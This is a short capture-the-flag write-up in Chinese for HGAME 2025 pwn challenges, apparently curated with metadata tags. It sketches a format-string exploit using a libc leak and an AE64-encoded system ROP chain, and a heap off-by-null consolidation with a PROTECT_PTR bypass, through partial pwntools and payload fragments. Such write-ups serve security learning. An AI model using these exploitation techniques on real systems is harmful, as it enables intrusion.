---
title: HGAME2025杭州电子科技大学网络攻防大赛 PWN writeup
contest: HGAME 2025 杭电
year: 2025
difficulty: medium
vuln_type: fmt_string
tags: [pwn, format-string, vuln-negative-bypass, libc-leak, ae64, rop, glibc-all-in-one]
attack_chain:
  - 3字节格式化字符串漏洞
  - vuln=-1绕过
  - %*d+%s 泄露libc地址
  - AE64编码system ROP链
  - week1 format系列
  - week2 diary keeper: PROTECT_PTR 指针保护
  - patchelf替换libc 2.35
  - 申请chunkA/B/C/D
  - off by null合并A+B+C
  - 读写合并大chunk操作B内容
key_payload: %*d+%s leak libc; AE64(system ROP)
one_liner: HGAME 2025 PWN：format字符串+diary keeper off-by-null合并
lesson: 负索引vuln可绕过；PROTECT_PTR指针保护可用低12位异或绕过
quality: high
---

# HGAME2025杭州电子科技大学网络攻防大赛 PWN writeup

## 题目信息
- 比赛：HGAME 2025 杭州电子科技大学
- 类别：PWN
- 战队：Mini-Venom（ChaMd5）

## 关键攻击链
### week1 format
- 无数次格式化字符串漏洞，但一次只有 3 字节
- `vuln` 可直接用 `-1` 绕过
- `%*d+%s` 泄露 libc 地址
- 后续直接打 system 的 ROP 链
- AE64 编码
```python
from ae64 import AE64
context(os='linux', arch='amd64', log_level='debug')
libc = ELF('./libc.so.6')
elf = ELF('./pwn')
p = remote('node1.hgame.vidar.club', 31079)
```

### week2 diary keeper
```bash
patchelf --set-interpreter /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/ld-linux-x86-64.so.2 ./vuln
patchelf --replace-needed libc.so.6 /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/libc.so.6 ./vuln
```

```c
#define PROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```
- 申请 chunkA、chunkB、chunk C、chunk D
- chunk D 做 gap
- 释放 A 进入 unsortedbin
- 对 B 写操作存在 off by null，修改 C 的 PREV_INUSE
- 释放 C 时堆后向合并 → A+B+C 合并
- 读写合并后大 chunk 可操作 B 内容

```python
payload = flat({
    0x8: 1, 0x10: 0, 0x38: address_for_rdi,
    0x28: address_for_call, 0x18: 1, 0x20: 0,
    0x40: 1, 0xd0: heap_base+0x250, 0xc8: ...
})
```

## 评分
- quality: high（格式化字符串+off-by-null 合并+PROTECT_PTR 绕过）
